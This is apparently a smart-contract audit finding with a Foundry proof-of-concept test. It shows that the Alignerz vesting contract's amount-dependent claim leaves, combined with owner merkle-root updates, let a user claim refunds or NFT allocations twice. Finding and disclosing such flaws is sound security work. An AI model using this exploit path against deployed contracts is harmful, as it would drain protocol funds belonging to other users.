# [000656] HIGH Merkle root updates after claims enable double-refund/double-allocation attacks due to amount-dependent leaf tracking
  
  ### Summary

Using amount-dependent leaf hashing combined with unrestricted merkle root updates in `updateProjectAllocations` will cause fund drainage for the protocol as a user (maliciously or through owner error) will claim refunds or NFT allocations multiple times by exploiting merkle root updates that change the `amount` parameter, creating new unclaimed leaves and receiving multiple payouts for the same logical bid.

### Root Cause


https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L842C7-L848C1

In `AlignerzVesting.claimRefund` and `AlignerzVesting.claimNFT`, the claim tracking mechanism uses a leaf computed as `keccak256(abi.encodePacked(msg.sender, amount, projectId, poolId))`, which includes the `amount` parameter.

```solidity
function claimRefund(uint256 projectId, uint256 amount, bytes32[] calldata merkleProof) external {
    // ...
    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, amount, projectId, poolId));
    require(!claimedRefund[leaf], Already_Claimed());
    require(MerkleProof.verify(merkleProof, biddingProject.refundRoot, leaf), Invalid_Merkle_Proof());
    claimedRefund[leaf] = true;
    // ...
}
```

Meanwhile, `updateProjectAllocations` allows the owner to update both `refundRoot` and pool `merkleRoot` values at any time after finalization, with no restriction that claims must not have occurred yet:[1]

```solidity
function updateProjectAllocations(
    uint256 projectId,
    bytes32 refundRoot,
    bytes32[] calldata merkleRoots
) external onlyOwner {
    require(projectId < biddingProjectCount, Invalid_Project_Id());
    BiddingProject storage biddingProject = biddingProjects[projectId];
    require(biddingProject.closed, Project_Still_Open());
    // NO check that no claims have happened yet!
    
    for (uint256 poolId = 0; poolId < biddingProject.poolCount; poolId++) {
        biddingProject.vestingPools[poolId].merkleRoot = merkleRoots[poolId];
    }
    biddingProject.refundRoot = refundRoot;
}
```

When the owner updates a merkle root with a tree where the same user's entry has a **different** `amount` value (e.g., correcting an error or adjusting allocations), the new leaf `keccak256(msg.sender, newAmount, projectId, poolId)` is distinct from the old leaf `keccak256(msg.sender, oldAmount, projectId, poolId)`, so `claimedRefund[newLeaf]` and `claimedNFT[newLeaf]` are still `false` even if the user already claimed under the old merkle root.

This allows the user to claim twice: once with `oldAmount` under the original root, and again with `newAmount` under the updated root, receiving two separate payouts for what should be a single logical refund or allocation.

### Internal Pre-conditions

1. A bidding project needs to be finalized via `finalizeBids` with initial merkle roots (`refundRootV0` and/or pool allocation roots), where at least one user appears with a specific `amount0` value.

2. The user needs to claim their refund or NFT allocation under the original merkle root by calling `claimRefund(projectId, amount0, proofV0)` or `claimNFT(projectId, poolId, amount0, proofV0)`, which sets `claimedRefund[leaf0] = true` or `claimedNFT[leaf0] = true` where `leaf0 = keccak256(user, amount0, projectId, poolId)`.

3. The owner needs to call `updateProjectAllocations(projectId, refundRootV1, merkleRootsV1)` with new merkle trees where the same user's entry uses a **different** amount value `amount1 != amount0` (whether accidentally or intentionally).

4. The claim deadline `biddingProject.claimDeadline` must not have passed yet, so `block.timestamp < claimDeadline` allowing the user to claim again.


### External Pre-conditions

1. The bidding project contract needs to hold sufficient stablecoin or token balances to cover both the first and second claim by the same user.

2. No specific oracle, gas price, or external protocol condition is required; the bug is purely due to the leaf construction and update logic.


### Attack Path

1. A bidding project is launched, and a user (loser) places a bid of `BIDDER_USD = 1000e18` USDC.

2. The project creator finalizes bids via `finalizeBids(projectId, refundRootV0, poolRoots, claimWindow)`, where `refundRootV0` includes the loser with `amount = 1000e18` for a full refund.

3. The loser calls `claimRefund(projectId, 1000e18, proofV0)`:
   - Computes `leaf0 = keccak256(loser, 1000e18, projectId, 0)`
   - Verifies proof against `refundRootV0` (passes)
   - Sets `claimedRefund[leaf0] = true`
   - Receives 1000e18 USDC refund via `stablecoin.safeTransfer(loser, 1000e18)`


4. Later, the owner realizes they need to "correct" allocations (or an attacker social-engineers the owner into updating), and calls `updateProjectAllocations(projectId, refundRootV1, poolRoots)` where `refundRootV1` includes the same loser but with `amount = 500e18` (half refund, different from the original).

5. The loser (or attacker if they control the address) now calls `claimRefund(projectId, 500e18, proofV1)`:
   - Computes `leaf1 = keccak256(loser, 500e18, projectId, 0)` (different from `leaf0` because amount changed)
   - Verifies proof against the new `refundRootV1` (passes)
   - Checks `!claimedRefund[leaf1]` (true, because only `claimedRefund[leaf0]` was set, not `leaf1`)
   - Sets `claimedRefund[leaf1] = true`
   - Receives an additional 500e18 USDC refund


6. The loser has now received a total of 1500e18 USDC refund (1000e18 + 500e18) for a single 1000e18 bid, stealing 500e18 from the protocol.

7. The same attack works for NFT allocations via `claimNFT`: if the owner updates pool merkle roots with different amounts for the same user, the user can mint multiple NFTs representing separate allocations, all claimable later via `claimTokens`.

8. This attack can be repeated for any number of merkle root updates where amounts change, limited only by the claim deadline and available contract balances.


### Impact

The protocol suffers fund drainage as users can claim multiple refunds or NFT allocations for the same bid by exploiting merkle root updates that change the `amount` parameter. For a project where the owner updates allocations even once after some users have claimed, and where amounts differ between versions, affected users can double-claim (or triple-claim for multiple updates), with each claim transferring real stablecoin or minting additional NFTs representing vested tokens. In the demonstrated test case, a user receives 1.5x their original bid amount in refunds (1000 + 500 = 1500 for a 1000 bid), representing a 50% loss to the protocol per affected user, and this scales linearly with the number of users who exploit the vulnerability and the number of merkle updates.

### PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";
import {CompleteMerkle} from "murky/src/CompleteMerkle.sol";
import {A26ZDividendDistributor} from "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";


contract A26ZDividendDistributorHarness is A26ZDividendDistributor {
    constructor(
        address _vesting,
        address _nft,
        address _stablecoin,
        uint256 _startTime,
        uint256 _vestingPeriod,
        address _token
    )
        A26ZDividendDistributor(
            _vesting,
            _nft,
            _stablecoin,
            _startTime,
            _vestingPeriod,
            _token
        )
    {}

    // Test-only helper to seed accounting for a given NFT id
    function seedAccounting(
        uint256 nftId,
        uint256 unclaimedForNft,
        uint256 _totalUnclaimed,
        uint256 _stablecoinToDistribute
    ) external {
        unclaimedAmountsIn[nftId] = unclaimedForNft;
        totalUnclaimedAmounts = _totalUnclaimed;
        stablecoinAmountToDistribute = _stablecoinToDistribute;
    }
}


contract AlignerzVestingProtocolTest is Test {
    AlignerzVesting public vesting;
    Aligners26 public token;
    AlignerzNFT public nft;
    MockUSD public usdt;
    A26ZDividendDistributor public distributor;

    address public owner;
    address public projectCreator;
    address[] public bidders;

    // Constants
    uint256 constant NUM_BIDDERS = 20;
    uint256 constant TOKEN_AMOUNT = 26_000_000 ether;
    uint256 constant BIDDER_USD = 1_000 ether;
    uint256 constant PROJECT_ID = 0;

    // Project structure for organization
    struct BidInfo {
        address bidder;
        uint256 amount;
        uint256 vestingPeriod;
        uint256 poolId;
        bool accepted;
    }

    // Track allocated bids and their proofs
    mapping(address => bytes32[]) public bidderProofs;
    mapping(address => uint256) public bidderPoolIds;
    mapping(address => uint256) public bidderNFTIds;
    bytes32 public refundRoot;

    function setUp() public {
        owner = address(this);
        projectCreator = makeAddr("projectCreator");
        vm.deal(projectCreator, 100 ether);

        // Deploy contracts
        usdt = new MockUSD();
        token = new Aligners26("26Aligners", "A26Z");
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        address payable proxy = payable(Upgrades.deployUUPSProxy(
            "AlignerzVesting.sol",
            abi.encodeCall(AlignerzVesting.initialize, (address(nft))))
        );
        vesting = AlignerzVesting(proxy);

        // Set NFT minter to vesting contract
        vm.prank(owner);
        nft.addMinter(proxy);
        vesting.setTreasury(address(1));

        // Create bidders with ETH and USDT
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            address bidder = makeAddr(string.concat("bidder", vm.toString(i)));
            vm.deal(bidder, 50 ether);
            bidders.push(bidder);
            usdt.mint(bidder, BIDDER_USD);
        }

        // Mint tokens for project creator
        token.transfer(projectCreator, TOKEN_AMOUNT);
        vesting.transferOwnership(projectCreator);

        // Approve tokens for vesting contract
        vm.prank(projectCreator);
        token.approve(address(vesting), TOKEN_AMOUNT);
    }

    // Helper function to create a leaf node for the merkle tree
    function getLeaf(address bidder, uint256 amount, uint256 projectId, uint256 poolId)
        internal
        pure
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(bidder, amount, projectId, poolId));
    }

    // Helper for generating merkle proofs
    function generateMerkleProofs(BidInfo[] memory bids, uint256 poolId) internal returns (bytes32) {
        bytes32[] memory leaves = new bytes32[](bids.length);
        uint256 leafCount = 0;

        // Create leaves for each bid in this pool
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                leaves[leafCount] = getLeaf(bids[i].bidder, bids[i].amount, PROJECT_ID, poolId);

                bidderPoolIds[bids[i].bidder] = poolId;
                leafCount++;
            }
        }

        CompleteMerkle m = new CompleteMerkle();
        bytes32 root = m.getRoot(leaves);
        uint256 indexTracker = 0;
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                bytes32[] memory proof = m.getProof(leaves, indexTracker);
                bidderProofs[bids[i].bidder] = proof;
                indexTracker++;
            }
        }

        return root;
    }

    // Helper for generating refund proofs
    function generateRefundProofs(BidInfo[] memory bids) internal returns (bytes32) {
        bytes32[] memory leaves = new bytes32[](bids.length);
        uint256 leafCount = 0;
        uint256 poolId = 0;

        // Create leaves for each bid in this pool
        for (uint256 i = 0; i < bids.length; i++) {
            if (!bids[i].accepted) {
                leaves[leafCount] = getLeaf(bids[i].bidder, bids[i].amount, PROJECT_ID, poolId);

                bidderPoolIds[bids[i].bidder] = poolId;
                leafCount++;
            }
        }

        CompleteMerkle m = new CompleteMerkle();
        bytes32 root = m.getRoot(leaves);
        uint256 indexTracker = 0;
        for (uint256 i = 0; i < bids.length; i++) {
            if (!bids[i].accepted) {
                bytes32[] memory proof = m.getProof(leaves, indexTracker);
                bidderProofs[bids[i].bidder] = proof;
                indexTracker++;
            }
        }

        return root;
    }



    function test_RefundDoubleClaimAfterMerkleUpdate() public {
        // -----------------------------
        // 1. Setup: single-pool project with two bidders
        // -----------------------------
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);

        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            block.timestamp,
            block.timestamp + 1_000_000,
            bytes32(0),
            true // whitelist enabled
        );
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);

        // Whitelist two bidders so we have one winner, one loser
        address loser = bidders[0];
        address winner = bidders[1];
        address[] memory someBidders = new address[](2);
        someBidders[0] = loser;
        someBidders[1] = winner;
        vesting.addUsersToWhitelist(someBidders, PROJECT_ID);
        vm.stopPrank();

        // Both place identical bids into the same pool
        for (uint256 i = 0; i < 2; i++) {
            address bidder = bidders[i];
            vm.startPrank(bidder);
            usdt.approve(address(vesting), BIDDER_USD);
            vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
            vm.stopPrank();
        }

        // -----------------------------
        // 2. Off-chain allocation v0:
        //    winner accepted (no refund), loser rejected (refunded)
        // -----------------------------
        BidInfo[] memory allBidsV0 = new BidInfo[](2);

        // bidder[0] = loser (rejected => goes into refund tree)
        allBidsV0[0] = BidInfo({
            bidder: loser,
            amount: BIDDER_USD,
            vestingPeriod: 90 days,
            poolId: 0,
            accepted: false
        });

        // bidder[1] = winner (accepted => goes into allocation tree)
        allBidsV0[1] = BidInfo({
            bidder: winner,
            amount: BIDDER_USD,
            vestingPeriod: 90 days,
            poolId: 0,
            accepted: true
        });

        // Pool allocation root (for accepted bids)
        bytes32[] memory poolRoots = new bytes32[](1);
        poolRoots[0] = generateMerkleProofs(allBidsV0, 0);

        // Refund root v0 (for rejected bids)
        bytes32 refundRootV0 = generateRefundProofs(allBidsV0);

        // Finalize bids with initial roots
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, refundRootV0, poolRoots, 60);

        // -----------------------------
        // 3. Loser claims refund once under root v0
        // -----------------------------
        // After bidding, loser has spent BIDDER_USD, so balance should be ~0 before refund
        uint256 balanceBeforeFirstRefund = usdt.balanceOf(loser);

        vm.prank(loser);
        vesting.claimRefund(PROJECT_ID, BIDDER_USD, bidderProofs[loser]);

        uint256 balanceAfterFirstRefund = usdt.balanceOf(loser);
        assertEq(
            balanceAfterFirstRefund,
            balanceBeforeFirstRefund + BIDDER_USD,
            "first refund not received"
        );

        // -----------------------------
        // 4. Owner updates allocations with a *different* refund amount
        //    for the same loser in a new merkle tree
        // -----------------------------
        uint256 newRefundAmount = BIDDER_USD / 2; // any amount != BIDDER_USD triggers a new leaf

        BidInfo[] memory allBidsV1 = new BidInfo[](2);

        // loser again rejected but with a different amount
        allBidsV1[0] = BidInfo({
            bidder: loser,
            amount: newRefundAmount,
            vestingPeriod: 90 days,
            poolId: 0,
            accepted: false
        });

        // winner stays accepted with same amount (for simplicity)
        allBidsV1[1] = BidInfo({
            bidder: winner,
            amount: BIDDER_USD,
            vestingPeriod: 90 days,
            poolId: 0,
            accepted: true
        });

        // Rebuild ONLY the refund tree with the new amount for loser
        bytes32 refundRootV1 = generateRefundProofs(allBidsV1);
        // bidderProofs[loser] is now the proof for (loser, newRefundAmount, PROJECT_ID, 0) under refundRootV1

        // Update project allocations after some claims have already happened
        vm.prank(projectCreator);
        vesting.updateProjectAllocations(PROJECT_ID, refundRootV1, poolRoots);

        // -----------------------------
        // 5. Loser claims refund a second time under the updated root
        //    using newRefundAmount and the new proof
        // -----------------------------
        uint256 balanceBeforeSecondRefund = usdt.balanceOf(loser);

        // This SHOULD logically revert (already refunded), but due to the bug,
        // the new leaf (with different amount) bypasses claimedRefund[oldLeaf].
        vm.prank(loser);
        vesting.claimRefund(PROJECT_ID, newRefundAmount, bidderProofs[loser]);

        uint256 balanceAfterSecondRefund = usdt.balanceOf(loser);

        // Assert that a second refund was actually paid out
        assertEq(
            balanceAfterSecondRefund,
            balanceBeforeSecondRefund + newRefundAmount,
            "second refund was not paid"
        );

        // Sanity: total refunded > original bid, proving double-claim
        assertGt(
            balanceAfterSecondRefund,
            balanceBeforeFirstRefund + BIDDER_USD,
            "no net double-refund"
        );
    }





    function test_CompleteVestingFlow() public {
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);

        // 1. Launch project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);

        // 2. Create multiple pools with different prices
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.02 ether, false);
        vesting.createPool(PROJECT_ID, 4_000_000 ether, 0.03 ether, false);

        // 3. Place bids from different whitelisted users
        vesting.addUsersToWhitelist(bidders, PROJECT_ID);
        vm.stopPrank();
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            vm.startPrank(bidders[i]);

            // Approve and place bid
            usdt.approve(address(vesting), BIDDER_USD);

            // Different vesting periods to test variety
            uint256 vestingPeriod = (i % 3 == 0) ? 90 days : (i % 3 == 1) ? 180 days : 365 days;

            vesting.placeBid(PROJECT_ID, BIDDER_USD, vestingPeriod);
            vm.stopPrank();
        }

        // 4. Update some bids
        vm.prank(bidders[0]);
        vesting.updateBid(PROJECT_ID, BIDDER_USD, 180 days);

        // 5. Prepare bid allocations (this would be done off-chain)
        BidInfo[] memory allBids = new BidInfo[](NUM_BIDDERS);

        // Simulate off-chain allocation process
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            // Assign bids to pools (in reality, this would be based on some algorithm)
            uint256 poolId = i % 3;
            bool accepted = i < 15; // First 15 bidders are accepted

            allBids[i] = BidInfo({
                bidder: bidders[i],
                amount: BIDDER_USD, // For simplicity, all bids are the same amount
                vestingPeriod: (i % 3 == 0) ? 90 days : (i % 3 == 1) ? 180 days : 365 days,
                poolId: poolId,
                accepted: accepted
            });
        }

        // 6. Generate merkle roots for each pool
        bytes32[] memory poolRoots = new bytes32[](3);
        for (uint256 poolId = 0; poolId < 3; poolId++) {
            poolRoots[poolId] = generateMerkleProofs(allBids, poolId);
        }

        // 7. Generate refund proofs
        refundRoot = generateRefundProofs(allBids);

        // 8. Finalize project with merkle roots
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, refundRoot, poolRoots, 60);
        uint256[] memory nftIds = new uint256[](15);
        // 9. Users claim NFTs with proofs
        for (uint256 i = 0; i < 15; i++) {
            // Only accepted bidders
            address bidder = bidders[i];
            uint256 poolId = bidderPoolIds[bidder];

            vm.prank(bidder);
            uint256 nftId = vesting.claimNFT(PROJECT_ID, poolId, BIDDER_USD, bidderProofs[bidder]);
            nftIds[i] = nftId;
            vm.prank(bidder);
            //(uint256 oldNft, uint256 newNft) = vesting.splitTVS(PROJECT_ID, nftId, 5000);
            //assertEq(oldNft, nftId);
            bidderNFTIds[bidder] = nftId;

            // Verify NFT ownership
            assertEq(nft.ownerOf(nftId), bidder);
        }

        // 10. Some users try to claim refunds
        for (uint256 i = 15; i < NUM_BIDDERS; i++) {
            // Only Refunded bidders
            address bidder = bidders[i];
            vm.prank(bidder);
            vesting.claimRefund(PROJECT_ID, BIDDER_USD, bidderProofs[bidder]);

            // Verify USDT was returned
            assertEq(usdt.balanceOf(bidders[i]), BIDDER_USD);
        }

        // 11. Fast forward time to simulate vesting period
        vm.warp(block.timestamp + 60 days);

        // 12. Users claim tokens after vesting period
        for (uint256 i = 0; i < 15; i++) {
            address bidder = bidders[i];
            //uint256 nftId = bidderNFTIds[bidder];

            uint256 tokenBalanceBefore = token.balanceOf(bidder);

            vm.prank(bidder);
            vesting.claimTokens(PROJECT_ID, nftIds[i]);

            uint256 tokenBalanceAfter = token.balanceOf(bidder);
            assertTrue(tokenBalanceAfter > tokenBalanceBefore, "No tokens claimed");
        }

        // 13. Fast forward more time to simulate complete vesting
        vm.warp(block.timestamp + 365 days);

        // 14. Users claim remaining tokens
        for (uint256 i = 0; i < 15; i++) {
            address bidder = bidders[i];
            uint256 nftId = bidderNFTIds[bidder];

            // Skip if NFT was already burned due to full claim
            if (nftId == 0) continue;

            try nft.ownerOf(nftId) returns (address ownerOf) {
                if (ownerOf == bidder) {
                    vm.prank(bidder);
                    vesting.claimTokens(PROJECT_ID, nftId);
                }
            } catch {
                // NFT was already burned, which means tokens were fully claimed
            }
        }

        // 15. Update project allocations (optional test)
        bytes32[] memory newPoolRoots = new bytes32[](3);
        for (uint256 i = 0; i < 3; i++) {
            newPoolRoots[i] = keccak256(abi.encodePacked("new_pool_root", i));
        }

        vm.prank(projectCreator);
        vesting.updateProjectAllocations(PROJECT_ID, keccak256(abi.encodePacked("new_refund_root")), newPoolRoots);
    }

    function test_MultipleProjectsFlow() public {
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);
        // Similar to the complete flow but with multiple projects
        // This demonstrates the contract's ability to handle multiple projects simultaneously

        // Setup first project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);
        vesting.createPool(0, 3_000_000 ether, 0.01 ether, true);
        vesting.addUsersToWhitelist(bidders, 0);
        vm.stopPrank();

        // Setup second project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp + 100, block.timestamp + 1_100_000, "0x0", true);
        vesting.createPool(1, 3_000_000 ether, 0.015 ether, false);
        vesting.addUsersToWhitelist(bidders, 1);
        vm.stopPrank();

        vm.warp(block.timestamp + 100);
        // Place bids for both projects
        for (uint256 i = 0; i < 10; i++) {
            vm.startPrank(bidders[i]);
            usdt.approve(address(vesting), BIDDER_USD);
            vesting.placeBid(0, BIDDER_USD / 2, 90 days);
            vm.stopPrank();

            vm.startPrank(bidders[i + 10]);
            usdt.approve(address(vesting), BIDDER_USD);
            vesting.placeBid(1, BIDDER_USD / 2, 180 days);
            vm.stopPrank();
        }

        // Simplified allocation for both projects
        bytes32[] memory poolRootsProject0 = new bytes32[](1);
        poolRootsProject0[0] = keccak256(abi.encodePacked("project0_pool0"));

        bytes32[] memory poolRootsProject1 = new bytes32[](1);
        poolRootsProject1[0] = keccak256(abi.encodePacked("project1_pool0"));

        // Finalize both projects
        vm.startPrank(projectCreator);
        vesting.finalizeBids(0, bytes32(0), poolRootsProject0, 60);
        vesting.finalizeBids(1, bytes32(0), poolRootsProject1, 60);
        vm.stopPrank();
    }
}
```

run forge test --ffi --force --mt test_RefundDoubleClaimAfterMerkleUpdate -vvvv

### Mitigation

_No response_
  